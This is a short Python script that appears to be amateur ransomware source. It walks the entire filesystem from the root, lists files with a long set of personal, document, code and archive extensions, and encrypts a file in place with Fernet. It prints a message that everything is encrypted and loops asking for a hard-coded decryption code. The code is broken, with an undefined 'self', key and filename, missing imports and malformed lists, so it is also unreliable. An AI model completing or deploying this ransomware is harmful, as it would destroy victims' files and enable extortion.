import os
import time
import urllib
import urllib.request
import random
keycode = ["1111111111111111111111"]
EXTENSIONS = (
        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw','.exe', '.bat'
        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape',
        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp',

        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx',
        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt',
        '.yml', '.yaml', '.json', '.xml', '.csv',
        '.db', '.sql', '.dbf', '.mdb', '.iso',
        
        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css',
        '.c', '.cpp', '.cxx', '.h', '.hpp',
        '.java', '.class', '.jar',
        '.ps', '.bat', '.vb', '.vbs'
        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift',
        '.go', '.py', '.pyc', '.bf', '.coffee',
        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak')
def FindFiles(self):
    f = open("logs/path.txt", "w")
    cnt = 0
    for root, dirs, files in os.walk("/"):
            if any(s in root for s in self.EXCLUDE_DIRECTORY):
                pass
            else:
                for file in files:
                     if file.endswith(self.EXTENSIONS):
                        TARGET = os.path.join(root, file)
                        f.write(TARGET+'\n')
                        print(root)
    f.close()
    f = open("logs/cnt.txt", "w")
    f.write(str(cnt))
    f.close()
FindFiles(self)
def Encrypt(self):
        print("YOUR FILES/PHOTOS/VOICE MEMOS/PDF'S/SYSTEM FILES... EVERYTHING IS ENCRYPTED.")
        f = Fernet(key)
        with open(filename, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(filename, "wb") as file:
            file.write(encrypted_data)
        print(filename)
Encrypt(self)
while True:
 key = input("Enter code to decrypt: ")
 if key == keycode:
    def DECRYPT_FILE():
        key = entry1.get()
        f = Fernet(key)
        with open(filename, "rb") as file:
            encrypted_data = file.read()
            decrypted_data = f.decrypt(encrypted_data)
            with open(filename, "wb") as file:
                file.write(decrypted_data)
    DECRYPT_FILE()
 if key != keycode:
    print("You wrote the wrong Dectypting password.")
    continue
